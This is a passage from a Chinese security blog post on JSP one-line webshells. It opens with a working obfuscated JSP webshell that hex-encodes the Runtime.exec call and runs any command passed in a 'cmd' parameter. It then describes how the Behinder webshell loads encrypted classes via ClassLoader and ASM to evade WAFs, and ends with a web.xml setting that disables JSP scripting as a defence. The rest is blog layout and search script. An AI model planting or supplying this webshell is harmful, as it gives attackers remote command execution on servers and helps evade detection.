+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> <span class="keyword">import</span>=<span class="string">"javax.xml.bind.DatatypeConverter"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">"cmd"</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">"6a6176612e6c616e672e52756e74696d65"</span>)));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary("65786563")), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary("67657452756e74696d65"))).invoke(null), request.getParameter("cmd") );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-冰蝎分析"><a href="#0x04-冰蝎分析" class="headerlink" title="0x04 冰蝎分析"></a>0x04 冰蝎分析</h2><p>​    上述的其实已经对冰蝎的思路有了一个铺垫，再详细学习一点冰蝎的内部实现。</p>
+<p>​    作者定义了一个类t继承classloader，调用时返回父类的defineClass方法，就解决了protected的限制，返回解析后的Class。当然也可以用反射的方法动态加载二进制加密数据。</p>
+<p>​    因为利用的是动态二进制的加密 ，所以需要class文件的动态生成，不能每次都去编译。所以涉及到了java的asm框架。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为，也就是动态修改class文件中的属性值。</p>
+<p><img src="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/2020.png" alt></p>
+<p>需要执行的命令是编码在class文件中的，因为class是已编译好的文件。但不能每次执行命令时都编译payload，那么就需要payload可以接收参数。为了参数被waf拦截，自然也是二进制流，所以作者使用ASM框架来动态修改class文件中的属性值。从上面的代码就可以看出，只需要向getParamedClass方法传递payload类名、参数列表即可获得经过参数化的payload class。</p>
+<h2 id="0x05-安全防范"><a href="#0x05-安全防范" class="headerlink" title="0x05 安全防范"></a>0x05 安全防范</h2><p>前提条件是：你的 Java Web 应用没有在 Jsp 中直接使用任何 Java 代码，否则会对应用本身造成影响。</p>
+<p>方法：</p>
+<p>在 web.xml 文件中加下以下配置：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp-config&gt;</span><br><span class="line"></span><br><span class="line">	&lt;jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">		&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/jsp-property-group&gt;</span><br><span class="line"></span><br><span class="line">&lt;/jsp-config&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>配置生效后，将不允许 Jsp/Jspx 文件中包含任何 scripting，包括：</p>
+<ol>
+<li>&lt;%%&gt; 与 <a href="jsp:scriptlet">jsp:scriptlet</a></li>
+<li>&lt;%!%&gt; 与 <a href="jsp:declaration">jsp:declaration</a></li>
+<li>&lt;%=%&gt; 与 <a href="jsp:expression">jsp:expression</a></li>
+</ol>
+<p><a href="https://zgao.top/" target="_blank" rel="noopener">https://zgao.top/</a></p>
+<p><a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">https://xz.aliyun.com/t/2744</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/" rel="next" title="waf bypass/waf bypass技巧">
+                <i class="fa fa-chevron-left"></i> waf bypass/waf bypass技巧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/user.jpg"
+                alt="Virusday" />
+            
+              <p class="site-author-name" itemprop="name">Virusday</p>
+              <p class="site-description motion-element" itemprop="description">学习的日常</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <!-- modify icon to fire by szw -->
+                <i class="fa fa-history fa-" aria-hidden="true"></i>
+                近期文章
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="jsp一句话木马/jsp一句话木马" target="_blank">jsp一句话木马/jsp一句话木马</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/" title="waf bypass/waf bypass技巧" target="_blank">waf bypass/waf bypass技巧</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/" title="XSS绕过总结/XSS深入" target="_blank">XSS绕过总结/XSS深入</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集/信息收集" target="_blank">信息收集/信息收集</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/" title="JAVA JNDI注入/JAVA JNDI注入" target="_blank">JAVA JNDI注入/JAVA JNDI注入</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02"><span class="nav-number">2.</span> <span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一：-执行系统命令"><span class="nav-number">2.1.</span> <span class="nav-text">一： 执行系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、把字符串编码后写入指定文件的："><span class="nav-number">2.2.</span> <span class="nav-text">二、把字符串编码后写入指定文件的：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、-反射调用外部jar包"><span class="nav-number">2.3.</span> <span class="nav-text">四、 反射调用外部jar包</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-免杀！"><span class="nav-number">3.</span> <span class="nav-text">0x03 免杀！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#类加载"><span class="nav-number">3.1.</span> <span class="nav-text">类加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过d盾"><span class="nav-number">3.2.</span> <span class="nav-text">过d盾</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JSP标签"><span class="nav-number">3.2.1.</span> <span class="nav-text">JSP标签</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-冰蝎分析"><span class="nav-number">4.</span> <span class="nav-text">0x04 冰蝎分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-安全防范"><span class="nav-number">5.</span> <span class="nav-text">0x05 安全防范</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-id-card"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Virusday</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">50k</span>
+  
+</div>
+-->
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Virusday</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
